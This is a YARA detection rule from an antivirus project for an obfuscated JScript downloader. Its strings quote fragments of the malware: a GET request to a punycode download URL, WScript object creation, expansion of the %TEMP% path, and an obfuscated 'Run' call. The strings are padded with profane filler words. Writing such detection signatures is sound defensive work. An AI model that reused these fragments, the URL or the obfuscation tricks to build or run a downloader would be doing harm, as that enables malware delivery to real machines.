rule sig_20160428_42287021f569e2fbec0832aae29d3837 {
  meta:
    description = "datamaliciousorder - file 20160428_42287021f569e2fbec0832aae29d3837.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c55fcbb64b0b44b7ac734e88fb59498113f729495ef8289f15a81917af938862"

  strings:
    $s1  = "YhkKjbUcnXtjKfiXkxCpc[DrtHemHimCeoCpkRrzGgl](\"G\" + \"ET\", \"http://xn--12ct7bab7ccc0ga4bik3a2b1koa4km8d.com/zmd7jf\", false);" ascii
    $s2  = "function DsoXphBfqUpbFeuIpfDyb(FecMquQvgSwcFrpOxtSfq){CklRqbOatSfjJskVgvWcu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function YecDqwDdhNinRneEwfWeh() {return CklRqbOatSfjJskVgvWcu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function DsoXphBfqUpbFeuIpfDyb(FecMquQvgSwcFrpOxtSfq){CklRqbOatSfjJskVgvWcu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "return EebJoaDjbBsnVxlJyyXse - XwuCouKinZvrMaxTmeVqv;};" fullword ascii
    $s6  = "function OcdJzgLmkAdeFzgSlcYuv(EebJoaDjbBsnVxlJyyXse, XwuCouKinZvrMaxTmeVqv){ZsqPvuHeeQkcSksWirKuz = ZsqPvuHeeQkcSksWirKuz * 1; " ascii
    $s7  = "function YecDqwDdhNinRneEwfWeh() {return CklRqbOatSfjJskVgvWcu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s8  = "var CklRqbOatSfjJskVgvWcu = function OdaKctTgnZnkXntLarQir() {return YfiJdaCaoNeoHjuXzeTol[BcsTkdLgjBenTzrHsoAsc](\"WScript\"+\"" ascii
    $s9  = "function OcdJzgLmkAdeFzgSlcYuv(EebJoaDjbBsnVxlJyyXse, XwuCouKinZvrMaxTmeVqv){ZsqPvuHeeQkcSksWirKuz = ZsqPvuHeeQkcSksWirKuz * 1; " ascii
    $s10 = "function OcrNbyLneWanHzvFxwFcm(){return OzaPycLfoIjsNbeOqyGnn + \"\";};" fullword ascii
    $s11 = "if (YhkKjbUcnXtjKfiXkxCpc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function MviWmmYgfAnhRrwFphUay() {return ((EtgLswRilKmxGamPjwWlr == true) && (EtgLswRilKmxGamPjwWlr == BzuFskFccOrrLwlCowUhv)) ?" ascii
    $s13 = "}while (BoxRunAjbSkqTwgVmrXlg);" fullword ascii
    $s14 = "function MviWmmYgfAnhRrwFphUay() {return ((EtgLswRilKmxGamPjwWlr == true) && (EtgLswRilKmxGamPjwWlr == BzuFskFccOrrLwlCowUhv)) ?" ascii
    $s15 = "var CklRqbOatSfjJskVgvWcu = function OdaKctTgnZnkXntLarQir() {return YfiJdaCaoNeoHjuXzeTol[BcsTkdLgjBenTzrHsoAsc](\"WScript\"+\"" ascii
    $s16 = "var YfiJdaCaoNeoHjuXzeTol = this[\"WScript\"];" fullword ascii
    $s17 = "function RmdTrdQiuAskBagHyfMsb(GpkYhqWriYgnTdhSotCiz) {var MenYksFauXcyEieAsgKqi = (1, 2, 3, 4, 5, GpkYhqWriYgnTdhSotCiz); retur" ascii
    $s18 = "var RtpHdfVawQdmHvqZooEjn = false;" fullword ascii
    $s19 = "function YqmXdxAakEwvZuhTqlVml(){return 23;};" fullword ascii
    $s20 = "BzuFskFccOrrLwlCowUhv = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}